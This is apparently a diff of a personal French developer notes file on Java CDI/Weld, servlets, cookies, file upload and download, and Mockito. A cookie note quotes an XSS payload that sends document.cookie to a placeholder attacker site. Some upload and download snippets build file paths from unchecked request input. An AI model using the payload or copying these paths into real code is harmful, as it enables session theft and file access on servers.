@@ -1,4 +1,4 @@
-(?=.*margin)(?=.*auto)
+(?=.*recharg)(?=.*profil)
 AFAIRE : 
     base de donnée h2 pour les tests unitaires à capitaliser
  authweb :AFAIRE_ACONVERTIR_EN_CURL.png
@@ -1110,7 +1110,7 @@ ajouter une dependence un pluggin dans le pom: alt+insert
 pour voir les stats (nombre de lignes de code etc...) charger le plugin de statistiques https://plugins.jetbrains.com/plugin/4509-statistic: on voit tout en bas une nouvelle icone pour les afficher   
 creer un bookmark flag tag ctrl+f11. Acceder à ce bookmark trouver: ctrl+chiffredubookmark. Ensuite editer la note du bookmark:shift+f11 puis Ctrl+entree sur le bookmark  
 supprimer les bookmarks: shift+f11 (j'ai le choix)
-si erreur  Error:java: invalid target release: 10 : file>settings...>build>java compiler>choisir la bonne version
+si erreur  Error:java: invalid target release: 10: file>settings...>build>java compiler>choisir la bonne version
 si erreur Error connecting to 127.0.0.1:51924; reason: Error:failed to create a child event loop
     redémarrer pc
 Piege: pour ajouter des jars dans le classpath: il ne faut pas ajouter les repertoires directories directorys contenant les jars mais directement les jars
@@ -1227,6 +1227,7 @@ renommer rename un projet:
 trouver une classe meme dans les dependances et jars: Ctrl+n
 replace remplacer: Ctrl+r puis alt+e pour y le faire
 remplacer partout: Ctrl+shift+r
+remplacer avec des retours chariot ca marche cocher regexp et le retour chario c'est \n
 hierarchie herite parent voir heritage: Ctrl+h
 voir hierarchie remonter methode parente sur methode faire Ctrl+u
 gotoline Ctrl+g
@@ -2270,8 +2271,41 @@ CDI1.x besoin de weld
 			<artifactId>weld-se-core</artifactId>
 			<version>3.0.1.Final</version>
 		</dependency>
-		
-<!-- pour utiliser les @ : scan les java qui ont :@Qualifier mieux que @Named(equivalent de @Qualifier de spring mais on l'utilise plutôt pour JSF), @Inject (equivalent de @Autowire de spring)
+
+        @EnableWeld=@ExtendWith(WeldJunit5Extension.class)//peut fonctionner en meme temps que mockito. Besoin de LINKweldgkl
+        ou
+        @EnableAutoWeld=@ExtendWIth(WeldJunit5AutoExtension.class)//injecte automatiquement. Pas besoin de LINKweldgkl
+		public class MaClasseDeTest{
+            @WeldSetup //facultatif pour gérer mes injections LINKweldgkl
+            public WeldInitiator weld = WeldInitiator.from(AbonnementService.class) //crée les beans dans un container virtuel pour tests.
+            .addBeans(
+                    uneMethodePourCreerMockerUnBean(),// je peux deporter la creation dans une autre methode
+                    MockBean.read(Utils.class).build(), //injectera Utils automatiquement dans le code projet si bonne annotation. Et c'est la vraie classe Utils dont je peux mocker chirurgiquement les methodes que je veux(voir ci dessous)
+                    MockBean.read(UserStore.class).build(),
+                    MockBean.builder()   // pour injecter un mock plutot qu'un bean complet. methode 1 
+                            .types(ProjectStore.class)
+                            .scope(RequestScoped.class)
+                            .addQualifier(MonQualifier.Literal.INSTANCE) // au cas ou j'ai un qualifier particulier
+                            .creating(
+                                    //new ApplicationConfigurationLocal()
+                                    ou
+                                    Mockito.mock(CreatedProjectOfUserStore.class) //si doit rien faire. void
+                                    ou
+                                    Mockito.when(Mockito.mock(ProjectStore.class).findByName(anyString())).thenReturn(new ArrayList<>(),autrechoseladeuxiemefois).getMock()
+                                    ou on peut utiliser .thenAnswer voir LINKmktoanswrweld
+                                    )
+                            .creating( // on peut créer comme ca en enchainant plusieurs comportements pour DIFFERENTES fonctions (pas la meme fonction sinon il ne prend que la dernière definition)
+                                    Mockito.when(Mockito.mock(ProjectStore.class).getProjectsCreatedByUser(anyString())).thenReturn(
+                                            Arrays.asList(new Project("bla","bli","blo","blu",new Date(),true,1.0))
+                                    ).getMock()
+                            )        
+                            .build(),
+                      MockBean.builder().types(IInterfaceDeMaClasseInjectee.class).creating(new ClasseMockQueJeCustomise()).build(), //methode2 tres bien aussi pour déporter le comportement voulu
+
+               ).activate(RequestScoped.class, ApplicationScoped.class).build(); // comme si j'étais dans ces scopes.
+        }
+            retrouver un bean de weld : weld.select(MonBeanInjecte.class).get() on peut lui faire executer quelquechose: String idProjet = weld.select(AbonnementService.class).get().createNewProjectFromMicrophone(properties);
+<!-- pour utiliser les @ : scan les java qui ont :@Qualifier (voir LINKqualifsdlfk) mieux que @Named(equivalent de @Qualifier de spring mais on l'utilise plutôt pour jsp et JSF), @Inject (equivalent de @Autowire de spring)
 Cycle de vie du CDI bean:
               – @RequestScoped // a mettre absolument sur un webservice utilisant jwt car les claims jwt sont naturelement request-scopeds. LINKkgkgkgklkjsdfljqi
               – @RedirectScoped // fait partie de mvc: utile si apres un post on fait un redirect et qu'on a besoin de l'info du post.
@@ -2281,20 +2315,78 @@ Cycle de vie du CDI bean:
                                 public void demarrage(@Observes @Initialized(ApplicationOuAutreScoped.class) Object init) // ou @Destroyed si c'est quand ca s'eteint. Ne prennent que des Scope LINKobsgdgdgz
                                 {(...)
               – @ViewScoped
+              - @Dependent // ne s'instancie que quand on fait appel à lui dans la classe qui l'injecte. Comme un new Blabla(); absence de proxy on a à faire directement à la classe.
               – @CustomScoped pour que les beans soient stockees dans le FacesContext (qui a une duree de vie plus courte que RequestScope donc FC est plus rapide, bouffe moins de memoire)
               – @NoneScoped (si c un bean qui est reference par un autre bean qui lui est scoped)
               >> attention un bean ne peut pas referencer un autre bean si son scope est plus petit que le sien (sauf les @NoneScoped que tous peuvent referencer)
-                  @PostConstruct-->methode s'execute quand le bean est place dans son scope utile pour initialiser marche sur EJB (du coup sur @Singlton) mais ne parche pas sur CDI du coup ApplicationScoped ne s'initialise pas avant d'être injectés. Du coup faire LINKobsgdgdgz
+                  @PostConstruct-->methode s'execute quand le bean est place dans son scope utile pour initialiser marche sur EJB (du coup sur @Singlton) mais ne marche pas sur CDI(sur?) du coup ApplicationScoped ne s'initialise pas avant d'être injectés. Du coup faire LINKobsgdgdgz
                   public void debut() { ... }//ne doit pas thrower une exception
                   @PreDestroy--->methode s'execute quand le bean est retire du scope ou le scope est detruit.
                   public void fin() { ... }
                  @TransactionAttribute pouf gerer les transactions (marche aussi sur ejb de type  @Stateful, @Stateless and @Singleton @ManagedBean, @WebServlet, @WebListener, @WebFilter)           
-          utilisation d'un champ injecté:                       définition de la classe de l'autre coté:
-          @Inject                                                @ApplicationScoped
-          @Named("simpleIs")//utiliser plutot @Qualifier         @Named("simpleIs")//utiliser plutot @Qualifier
-          private IdentityStore simpleIdentityStore;             public class SimpleIdentityStore implements IdentityStore {
-
+          utilisation d'un champ injecté:                                       définition de la classe de l'autre coté:
+            Injection par field:
+                @Inject                                                        @ApplicationScoped
+                @Named("simpleIs")//utiliser plutot @Qualifier.Ms ça c pour jsp  @Named("simpleIs")//utiliser plutot @Qualifier.Ms ça c pour jsp
+                private IdentityStore simpleIdentityStore;                       public class SimpleIdentityStore implements IdentityStore {
+            Injection par constructeur(mieux car crée immutable)
+               @Inject 
+               @MonQualifier               
+                MaClasse(IdentityStore estinjecte){this.identitystore=estinjecte}
+            Injection par methode
+               @Inject 
+               @MonQualifier               
+               public void toto(IdentityStore estinjecte){...}
+            les @Qualifier :LINKqualifsdlfk
+                dans la classe MonQualifierAMoi:
+                  @Target({ElementType.TYPE, ElementType.METHOD, ElementType.FIELD,ElementType.PARAMETER})
+                  @Retention(RetentionPolicy.RUNTIME)
+                  @Documented
+                  @NormalScope
+                  @Inherited
+                  public @interface MonQualifierAMoi { du coup j'ai à ma disposition un qualifier @MonQualifierAMoi
+                        @SuppressWarnings("all")
+                      public static final class Literal extends AnnotationLiteral<MonQualifierAMoi> implements MonQualifierAMoi { // il faut mettre tout ca pour que quand j'utilise weld je peux faire addQualifier
+                          private static final long serialVersionUID = 1L; 
+                          public static final MonQualifierAMoi.Literal INSTANCE = new MonQualifierAMoi.Literal();
+                          private Literal() {
+                      }
+                   }
+                  }
+            Un bean sans @Qualifier a  implicitement le qualifier @Default. Si j'injecte avec l'annotation @Any le container cherche tous les beans candidats avec un @Qualifier excluant du coup les implicites @Default
+                    exemple:
+                    @Inject
+                    void initServices(@Any Instance<Service> services)
+                    {
+                        for(Service service:services){...}
+                    }
+                    Les injections ne se font pas dans les new UneClasseAvecDesInjectDedans();
+                     pour que ça marche il faut faire si on fait new MaClasse();
+                     MaClasse() //constructeur
+                     {
+                     	CDI<Object> cdi = CDI.current(); // pas reussi jusqu'au bout ce truc
+		                leservice = cdi.select(ClasseInjectee.class).get();
+                     }            
+        design pattern factory remplacé par @Produces dans CDI LINKfactoproduce Bon moyen de choisir le bean au runtime
+        class MonFactory 
+            @Inject
+            ClasseA classeA; //ou bien LINKprodpara
+            @Inject
+            ClasseB classeB;
+              @Produces // de javax.enterprise.inject.Produces 
+              @MonQualifierAMoi //un Qualifier que j'ai crée voir LINKqualifsdlfk
+              @AppConfig                                
+              IApplicationConfiguration getApplicationConfiguration(){ ou LINKprodpara IApplicationConfiguration getApplicationConfiguration(ClasseA classea,ClasseB classb)// pas besoin de mettre @Inject ici dans un producer.
+                  if (machintruc)
+                  {
+                      return classeA;
+                  }
+                  else {
+                      return classeB;
+                  }
           
+              }
+
           faire des servlets sans web.xml: 
                 ajouter en tete de classe qui etend HttpServlet @WebServlet("/un/path") ou (urlPatterns={"/a","/b"}) ou (urlPatterns="/b") .  // marche sur version servlet spec >=3.0 DU coup mon path à attaquer c'est http://blabla:xx/monwar/un/path et faire request.getParmeters. Attention pour index page d'accueil on ne peut pas mettre / donc utiliser web.xml et welcome-file qui pointent sur une servlet ou une page
                  et @MultipartConfig // si je veux je crois que ma servlet gere l'upload de fichier (pas encore sur). recup les params avec request.getParmeters   
@@ -2588,6 +2680,305 @@ mvc : voir https://maarten.mulders.it/2018/09/a-first-look-at-mvc-1.0/ (parle de
                               
                           }
                       }
+        mvc servlet :
+            Avant: pour afficher une jsp depuis une servlet. Marche encore 
+            import java.io.*;
+            import javax.servlet.*;
+            import javax.servlet.http.*;
+            @WebServlet(value={"/sons/*"})( // pour ne pas avoir a declarer ma servlet dans web.xml                                        
+            public class HelloWWW extends HttpServlet {
+              public void doGet(HttpServletRequest request,
+                                HttpServletResponse response)
+                  throws ServletException, IOException {
+                  Pour afficher les elements d'un request: lister parametres
+                    	out.println(request.getParameter("param1") + "\n");
+                    ou
+                       Enumeration paramNames = request.getParameterNames();
+                       while(paramNames.hasMoreElements()) {
+                          String paramName = (String)paramNames.nextElement();
+                          String paramvalue= request.getParameter(paramName);
+                          log.info("<TR><TD>" + paramName + ","+paramvalue+"\n<TD>");
+                    ou 
+                      String[] paramValues = request.getParameterValues(paramName);
+                          etc etc...
+                    ou
+                  pour recuperer de manière sympa les parametres renvoyes par une page web:
+				protected String getStringParameter(String name){
+							return (String)getParameter(name, String.class);	
+						}
+						
+						protected Integer getIntegerParameter(String name){
+							return (Integer) getParameter(name, Integer.class);
+						}
+				appellent:
+				protected Object getParameter(String name, Class typeRetour){
+							try {
+								String value = request.getParameter(name);
+								Constructor constructeur = typeRetour.getConstructor(new Class[]{String.class});
+								return constructeur.newInstance(new Object[]{value});
+							} catch (Exception e) {
+								return null;
+							}
+						}
+
+                    ou si c'est dans le payload de la request
+                    	       BufferedReader reader= request.getReader(); // si le payload est dans la request LINK564894 sinon si c'est des paramètres de request Utiliser plutot LINKee"(çà)" 
+                             StringBuilder result = new StringBuilder();
+                             String line;
+                             while ((line = reader.readLine()) != null) {
+                            	 System.out.println("pffff"+line); 
+                                 result.append(line);
+                             }
+                             System.out.println("mon json: "+result.toString()); // result c'est le json. 
+                        ou voir LINKee"(çà)" si c'est multipart		 
+                    (Il y a aussi: recuperer l'url du request 
+                    request.getMethod() 
+                    request.getRequestURI() // pour connaitre l'url la page appelante. Exemple: /saml-landing
+                    request.getPathInfo() // recuperer le nom du fichier "/bip.wav"
+                    request.getRequestURL() // renvoit tout l'URL: http://monespacerh-dev.idkidscommunity.com/saml-landing. attention si existe reverse proxy ca renvoit le bon port et le bon host.(je crois) pas l'url origine initiale du client SINON:parametrer apache avec http://httpd.apache.org/docs/2.2/mod/mod_proxy.html#proxypreservehost
+                    request.getQueryString() // retourne l'url mais uniquement après "?"
+                    request.getScheme() // renvoit http ou https... attention si existe reverse proxy ca renvoit pas celui du reverseproxy mais celui du serveurMOI.(je crois)
+                    request.getServerName() // renvoit le domaine: monespacerh-dev.idkidscommunity.com
+                    ou bien   request.getHeader("referer") ;// si c'est un src= et qu'on souhaite vraiment connaitre la page appelante. Mais peut etre que c Referer(R maj)
+                    request.getProtocol() ... bof...)
+          recuperer un cookie a partir du request: afficher la liste des cookies : (isSecure(): le navigateur n'envoi le cookie dans reseau que si canal est securisé https (seuil "securisé" paramétrable sur le navigateur). (donc si http + secure impossible d'ouvrir session). httpOnly: empecher javascript d'acceder aux cookies LINKcooklskjhh (pirate peut injecter dans champ <img onload="document.location="http://site.pirate?c=document.cookie"); Host-only 
+                                Cookie[] cookies = request.getCookies();
+                                  String cookieName = SAPCookie;
+                                  String defaultValue = 1;
+                                  for ( int i=0; i<cookies.length; i++) {
+                                        Cookie cookie = cookies[i];
+                                        System.out.println(cookie.getPath());
+                                        if (cookieName.equals(cookie.getName()))
+                                          return(cookie.getValue());
+                                      }
+                                      return(defaultValue);
+                                    }
+            pour definir ajouter add un cookie:
+                response.addCookie(new Cookie("com.hraccess.portal.last_language", "fr_FR"));
+                  
+          Super methode: recupere la session si il y en a une. Sinon, il en cree une nouvelle      
+              à toute request requete meme sans moimeme creer de session, le serveur defini un jsessionid dans le cookie par defaut: je le recup sur le serveur comme ça:
+                  HttpSession session = servletRequest.getSession();
+              		String jsessionid = session.getId();
+                  HttpSession session = request.getSession(true); //// attention recree une  nouvelle session si elle n'existe plus (mettre false si on ne veut pas ca) 
+                  et ensuite on peut recuperer des variables liees à  cette session:
+                    ShoppingCart previousItems =(ShoppingCart)session.getAttribute("previousItems"); (ou getValue... mais deprecie)
+                   On peut tout recuperer avec l'objet session: le temps passe sur le site, le nombre de fois, la date d'acces au site....
+                   request.isRequestedSessionIdValid() // est equivalent à request.getSession(false); je crois. mais si je veux savoir si l'utilisateur a ete authentifie je devrais ajouter une variable dans la session. Ou bien utiliser le request.getUserPrincipal()? 
+            pour voir l'adresse ip du client adresse ip du reverse proxy:
+                String ipadress = request.getHeader("X-FORWARDED-FOR"); // renvoit l'adresse ip de l'utilisateur client original
+                if (ipadress==null)
+                {
+                  servletRequest.getRemoteAddr(); // ip du reverse proxy si il y en a 
+                }
+              ou recuperer adresse ip de l'appelant d'une servlet
+                  servletRequest.getRemoteAddr()
+          
+          pour recuperer le nom de l'utilisateur connecte: 
+              request.getUserPrincipal()
+          pour acceder à un fichier sous web-content webcontent en java: 
+          	request.getSession(false ou true).getServletContext().getRealPath("/resources/Tableau_de_bord.xls") // attention recree une  nouvelle session si elle n'existe plus (mettre false si on veut que ca renvoit null en cas de perte de session)
+                  // ou getServet().getServletContext()
+            	where /resources/Tableau_de_bord.xls is present inside the webcontent
+          	ou 
+              ClassificationNodeTest.class.getClassLoader().getResource(".")	ClassLoader.getResourceAsStream() ; ClassLoader.getResource() voir LINKgetRes9 verifier avec System.out.println("CLASSPATH: " + System.getProperty("java.class.path")); System.out.println("ClassLoader resource path: " + HRParameters.class.getClassLoader().getResource("hr-openhr-for-ta.properties")); voir LINKgetRes9 System.out.println("ClassLoader resource path: " + ClassLoader.getSystemResourceAsStream("hr-openhr-for-ta.properties"));
+              WelcomePresentor.class.getClassLoader().findResource("demo.css").getPath()
+                  upload du fichier cote serveur :
+          si apres servlet 3.0)  completer avec LINKmultilkjfqsdf
+                 je peux toujours faire request.getParameter("name") pour recuperer des parametres de l'url 
+                  for (Part part : request.getParts()) { // il y a les fichiers en PJ puis les champs. Les fichiers en PJ toujours en premier.
+                      //String fileName = getFileName(part);
+                      String fileName = "test"+i+".wav";
+                      log.info(uploadPath + File.separator + fileName);
+                      InputStream inputStream = part.getInputStream();
+                      part.getSize();
+                      byte[] fileContents = new byte[Math.round(part.getSize())];
+                      inputStream.read(fileContents);
+                      FileOutputStream outputFile = new FileOutputStream(new File(uploadPath + File.separator + fileName));
+                      OutputStream fos = new BufferedOutputStream(outputFile);
+                      fos.write(fileContents);
+                      fos.close();
+                     i++;
+              }
+              
+          upload du fichier cote serveur :avec apache Commons FileUpload (si avant servlet 3.0) si apres voir LINKmultilkjfqsdf
+                        public class ProfileUpload extends HttpServlet {   // Une vraie servlet, pas un service RPC
+                            @Override
+                            protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+                                attention ne pas utiliser getParameter(), getParameterMap(), getParameterValues(), getInputStream(), getReader(), etc avant ce qui suit 
+                                try {
+                                    ServletFileUpload upload = new ServletFileUpload();  //LINKee"(çà)" Une requete request ajax arrive. pour charger une image en servlet <3.0 sinon voir @WebServlet plus haut
+                        //            response.setContentType("image/x-png");
+                                    FileItemIterator iterator = upload.getItemIterator(req);
+                                    while (iterator.hasNext()) { // mettre un name a mon champ fileUpload sinon passera pas par ici. Attention on ne peut pas passer deux fois.
+                                        FileItemStream item = iterator.next();
+                                        if (!item.isFormField()) {   // On ne s'interesse pas aux differents champs du formulaire mais on pourrait
+                                            String filename = req.getParameter("id");
+                                            filename=PersistanceManagerFactorySingleton.getInstance().getImages_path()+filename+".png";
+                                            FileOutputStream out = new FileOutputStream(new File(filename));
+                                            InputStream in = item.openStream();
+                                            out.write(IOUtils.toByteArray(in));
+                                            out.close();
+                                            //response.getOutputStream().print(filename);   // On renvoie le nom d'origine du fichier ainsi que son nom aleatoire. Le code continue a s'executer apres donc attention.
+                                            response.setContentType("text/html");
+                                            response.getOutputStream().print(filename); //attention le code continue à s'executer en dessous
+                                            //response.getWriter().printf(filename);
+                                        }
+                                        else
+                                        {   //c'est un champ
+                                        	InputStream stream = item.openStream();
+                        					String name = item.getFieldName();
+                        					if (name.equals(fieldNameRequired)) {
+                        						String value = Streams.asString(stream);
+                        						return value;
+                        					}
+                                        }
+                                    }
+                                } catch (Exception ex) {
+                                    throw new ServletException(ex);
+                                }
+                            }
+                        }
+          pour recuperer une variable d'environnement qui est declaree dans web.xml:
+          			pour recuperer le numero de version
+          			String ttfPath = (String)ServiceLocator.getInstance().getRefByName("NOM_DE_LA_VARIABLE");
+          
+                  recuperer les valeurs d'un select du request
+                      request.getParameterValues("nomDeMonSelect"); // recupere les parametres get ou post. Ne pas confondre avec request.getAttribute() request.setAttribute() c'est uniquement cote serveur: utilisable entre jsp et servlet aussi. Ne vient pas d'une requette request http. Peut etre un objet LINKrequgeurei
+
+                  si je voulais renvoyer vers une jsp ou une page je ferais:request.getRequestDispatcher("(/WEB-INF?)/views/login.jsp").include(request, resp); ou si c'est vers un controlleur: voir plus haut LINKçç("'"'
+                    response.setContentType("text/html"); (ou application/txt etc etc...) // on peut rajouter des trucs apres un .include (je crois)
+                PrintWriter out = response.getWriter();
+                out.println("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 " +
+                                                    "Transitional//EN\">\n" +
+                            "<HTML>\n" +
+                            "<HEAD><TITLE>Hello WWW</TITLE></HEAD>\n" +
+                            "<BODY>\n" +
+                            "<H1>Hello WWW</H1>\n" +
+                            "</BODY></HTML>");
+              }
+            }
+    renvoyer les codes d'erreur ou de succes à la reponse:(200, 500 etc...) 
+      httpServletResponse.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
+  redirige redirection web en java: (voir aussi LINKRedirectwebservice)
+    HttpServletResponse servletResponse = (HttpServletResponse)response;
+    servletResponse.sendRedirect("http://www.google.com"); Fait une redirection 302( pour faire une 301 faire response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY);response.setHeader("Location", "http://somewhere/"); //pour un webservice voir //LINKredirwebservice998 
+    servletResponse.sendRedirect("/login");ou response.sendRedirect(request.getContextPath()+"/show.html"); // la requette request est renvoyee vers le client(url change sur browser navigateur) et redirige vers nouvelle url avec perte des params de la requette. !=.getRequestDispatcher("/urlduncontrolleurOuUneJSP.jsp").forward(req, resp) ça reste côte serveur: ça ne va pas vers navigateur client: les params de requette sont conserves. voir LINKçç("'"'
+          ATTENTION! forward et sendRedirect doivent être executées avant le commit de la response: pas de chain après ou d'autre redirection de requette! requette!  sinon j'aurais java.lang.IllegalStateException: Impossible d'utiliser faire-suivre (forward) après que la reponse ait ete envoyee
+     fichier :
+    pour renvoyer un fichier de la servlet (download): astuce, on peut aussi le zipper en java et envoyer le zip comme ca il n'y a pas de pb d'encodage
+            String filename = URLDecoder.decode(request.getPathInfo().substring(1),"UTF-8");
+            File file = new File(app.getProps().getProperty("SOUND_PATH").concat(filename));
+            response.setHeader("Content-Type",getServletContext().getMimeType(filename));
+            response.setHeader("Content-Length",String.valueOf(file.length()));
+            response.setHeader("Content-Disposition","inline; filename=\""+file.getName()+"\"");
+            Files.copy(file.toPath(),response.getOutputStream()); // pour copier ecrire le contenu d'un fichier dans un outputstream
+        avant:
+    	 String header = "attachement;filename="+fileName.substring(0,fileName.lastIndexOf("."));
+    				response.addHeader("content-disposition", header);
+    				response.setContentType("text");
+    		ServletOutputStream outstr = response.getOutputStream();
+    		FileInputStream lire = new FileInputStream(file);
+    		//BufferedReader reader = new BufferedReader(new InputStreamReader(lire)); // en fait si ca marche pour les fichiers UTF-8 à lire (utiliser mark et reset si besoin faire l'equivalent de pos de RandomAccessFile mais bon courage:-))
+    		NON!!! il faut utiliser les BufferedInputStream et output stream parce que bufferedreader encode! comme ca:
+    		BufferedInputStream bis = new BufferedInputStream(lire);
+    		NON: /*String ligne = "";
+    		while ((ligne=reader.readLine())!=null){
+    			ligne=ligne+System.getProperty("line.separator"); // LINKù*ù peut correspondre à ce quon envoit à java.exe via: -Dma.variable=/var/wtotototo...  a partir de java 5.1 on peut mettre "%n" (mettre les -D AVANT le -jar)
+    			outstr.write(ligne.getBytes("ISO-8859-1")); ou outstr.write(ligne.getBytes());
+    		}*/ voir ci dessous:
+    autre facon PROPRE(pas de pb encodage) de faire un download a partir de l'objet struts formFile
+    			public void upload(FormFile file, String location) throws Exception {
+    				InputStream inputStream = file.getInputStream();
+    				byte[] fileContents = new byte[file.getFileSize()];
+    				inputStream.read(fileContents);
+    				FileOutputStream outputFile = new FileOutputStream(new File(location + file.getFileName())); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
+    				OutputStream fos = new BufferedOutputStream(outputFile);
+    				fos.write(fileContent);
+    				fos.close();	    
+    Pour recuperer telecharger downloader un fichier java à partir d'une url faire une requete http lien et stocker ce fichier localement:
+    	 public static void urlFileToLocalFile(String urlFullpath, String localFullPath)
+    	    {
+    	        InputStream input = null;
+    	        FileOutputStream writeFile = null;
+    
+    	        try
+    	        {
+    	        //requete requette get
+    	            URL url = new URL(urlFullpath);
+    	            URLConnection connection = url.openConnection();
+    	            int fileLength = connection.getContentLength();
+    
+    	            if (fileLength == -1)
+    	            {
+    	                System.out.println("Invalide URL or file.");
+    	                return;
+    	            }
+    
+    	            input = connection.getInputStream();
+    	            String fileName = url.getFile().substring(url.getFile().lastIndexOf('/') + 1);
+    	            writeFile = new FileOutputStream(localFullPath); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
+    	            byte[] buffer = new byte[1024];
+    	            int read;
+    
+    	            while ((read = input.read(buffer)) > 0)
+    	                writeFile.write(buffer, 0, read);
+    	            writeFile.flush();
+    	        }
+    	        catch (IOException e)
+    	        {
+    	            System.out.println("Error while trying to download the file.");
+    	            e.printStackTrace();
+    	        }
+    	        finally
+    	        {
+    	            try
+    	            {
+    	                writeFile.close();
+    	                input.close();
+    	            }
+    	            catch (IOException e)
+    	            {
+    	                e.printStackTrace();
+    	            }
+    	        }
+    	    }
+                                   
+    Pour lire un fichier sur le serveur et le renvoyer pour ouverture dans le browser: 
+                    public static void downloadFichier(HttpServletRequest request, HttpServletResponse response, String type_PJ, String nomFichier) throws DaoException
+                    	{
+                    		String debut_msgConsole = "ERROR FROM PJsDao.downloadFichier()";
+                    		try
+                    		{
+                    		byte[] bytes = Files.readAllBytes(Paths.get(unObjetURL.getPath())));
+                    		avant: 
+                    			String filePath = getUploadDirectory(request) + "/" + type_PJ + "/" + nomFichier ;
+                    			FileInputStream stream = new FileInputStream(filePath); //chemin absolu necessaire
+                    			byte buf[] = new byte[stream.available()];
+                    			stream.read(buf);
+                    			response.reset();
+                    			response.setHeader("Expires", "0") ;
+                    			response.setHeader("Cache-Control","must-revalidate, post-check=0, pre-check=0, public");
+                    			
+                    			if(StringHelper.getExtensionFichier(nomFichier).equalsIgnoreCase("html"))
+                    			{
+                    				response.setContentType("text/html");
+                    			}
+                    			else
+                    			{
+                    				response.setContentType("application/x-file-download");
+                    				response.setHeader("Content-Disposition", "attachment; filename=" + nomFichier);
+                    			}
+                    			
+                    			ServletOutputStream outStream = response.getOutputStream();
+                    			outStream.write(buf) ;
+                    			outStream.flush();
+                    			stream.close();// pas besoin si je fais try(Writer writer = new FileWriter(unfichier)){
+                    			outStream.close();
+                    			//BufferedInputStream  bis = new BufferedInputStream(stream);
+                    			//outStream.write()
+                    		}
+  
         
 freemaker :
       <html>
@@ -2808,11 +3199,6 @@ Super methode: recupere la session si il y en a une. Sinon, il en cree une nouve
             request.getParameterValues("nomDeMonSelect"); // recupere les parametres get ou post. Ne pas confondre avec request.getAttribute() .setAttribute() c'est uniquement cote serveur: utilisable entre jsp et servlet aussi. Ne vient pas d'une requette request http. Peut etre un objet
    		
     		
-  redirige redirection web en java: (voir aussi LINKRedirectwebservice)
-    HttpServletResponse servletResponse = (HttpServletResponse)response;
-    servletResponse.sendRedirect("http://www.google.com"); Fait une redirection 302( pour faire une 301 faire response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY);response.setHeader("Location", "http://somewhere/"); //pour un webservice voir //LINKredirwebservice998 
-    servletResponse.sendRedirect("/login");ou response.sendRedirect(request.getContextPath()+"/show.html"); // la requette request est renvoyee vers le client(url change sur browser navigateur) et redirige vers nouvelle url avec perte des params de la requette. !=.getRequestDispatcher("/urlduncontrolleur").forward(req, resp) ça reste côte serveur: ça ne va pas vers navigateur client: les params de requette sont conserves. voir LINKçç("'"'
-          ATTENTION! doit être la dernière chose executee: pas de chain après ou d'autre redirection de requette! sinon j'aurais java.lang.IllegalStateException: Impossible d'utiliser faire-suivre (forward) après que la reponse ait ete envoyee          
   pour voir l'adresse ip du client adresse ip du reverse proxy:
       String ipadress = request.getHeader("X-FORWARDED-FOR"); // renvoit l'adresse ip de l'utilisateur client original
       if (ipadress==null)
@@ -16539,30 +16925,47 @@ JMockit :(le top car permet de tester l'intestable)>Mockito>EasyMock>Jmock AFAIR
           <version>1.10.19</version>
           <scope>test</scope>
       </dependency>
-		@InjectMocks // facultatif Mock peut marcher sans.
-		private RealTimePathCoverageController realTimePathCoverageController = new RealTimePathCoverageController(); // equivalent de @Tested dans jmockit : c'est une classe a tester dans laquelle je peux injecter des mocs LINKpourquecamarcheFairemokito
-		@Mock private RestTemplate restTemplate; // (peut etre une classe ou une interface) mock qui sera injectée dans RealTimePathCoverageController.
-			@Before
-				public void setup()
-				{
-					MockitoAnnotations.initMocks(this); // ca active les anotations @InjectMocks et @Mocks et @Spy // attention @Spy qui doit etre accompagné de par exemple @Autowired dans mon test car le bean doit exister avant que le spy s'applique: CA CA NE MARCHE PAS:mon objet spyé n'est pas le meme que celui qui est injecté dans le runcode.
-				}
-				FilterConfig filterConfig = mock(FilterConfig.class); // c'est soit je fais comme ca, soit j'utilise les anotations ci dessus. les deux font la meme chose
-				ServletContext context = mock(ServletContext.class);
-                ResultDao rd =mock ou spy(unObjetNONANNOTE ou new ResultDao() ou ResultDao.class); mock c'est pour mocker tout l'objet spy c'est pour mocker partiellement l'objet pour mocker qu'une seule methode dans l'objet mais du coup les injections d'autres objets dedans ne se font pas automatiquement et il faut alors utiliser des setters si j'ai besoin d'injecter des trucs dans le spy.
-                Mockito.doReturn(toto).when(rd).getLaMethodeResult("1"); // retourner toto quand on execute resultdao.getResult("1"); Utiliser ça pour les spy
-				when(filterConfig.getServletContext( // ca s'appelle faire du "stub" et utiliser ca je crois pour les mock
-				ou                                   anyString()//tout string
-				given                                  , eq(Http.GET)// si je peux pas faire "any" je fais ça . si je met des variables direct alors j'ai l'erreur InvalidUseOfMatchersException
-                                                    ,anyList() // ne pas utiliser anyObject si j'ai une liste
-													,Matchers.any(UneClasse.class) avant : anyObject(UneClasse.class)
-													).thenReturn(context);
-                pour indiquer de retourner une exception à un spy ou stub
-                        Mockito.doThrow(new HibernateException("err")).when(userWebDAO).create(Matchers.any(UserWebEntity.class)); 
-				WelcomeController wc = new WelcomeController(rd);
-				wc.getDisplayResult("1", "1","10:00", "10/10/2016");
-                validation verifier qu'un mock a été appelé invoké invoquée par une methode x fois nombre compter combien:
-                        verify(userDetailDAOMock, times(2)).laMathodeDuMock(any(UserDetailsEntity.class));
+
+      @ExtendWith(MockitoExtension.class)  // si junit5 seulement
+        public class UploadToServerServiceTest {
+    		@InjectMocks // facultatif Mock peut marcher sans.
+    		private RealTimePathCoverageController realTimePathCoverageController = new RealTimePathCoverageController(); // equivalent de @Tested dans jmockit : c'est une classe a tester dans laquelle je peux injecter des mocs LINKpourquecamarcheFairemokito
+    		@Mock ou @Spy     //Mock par defaut n'execute rien et on peut changer son comportement. Spy par defaut execute tout et on peut ecouter
+            private RestTemplate restTemplate; // (peut etre une classe ou une interface) mock qui sera injectée dans RealTimePathCoverageController.
+    			@Before
+    				public void setup()
+    				{
+    					MockitoAnnotations.initMocks(this); // ca active les anotations @InjectMocks et @Mocks et @Spy // attention @Spy qui doit etre accompagné de par exemple @Autowired dans mon test car le bean doit exister avant que le spy s'applique: CA CA NE MARCHE PAS:mon objet spyé n'est pas toujours le meme que celui qui est injecté dans le runcode.
+    				}
+    				FilterConfig filterConfig = mock(FilterConfig.class); // c'est soit je fais comme ca, soit j'utilise les anotations ci dessus. les deux font la meme chose
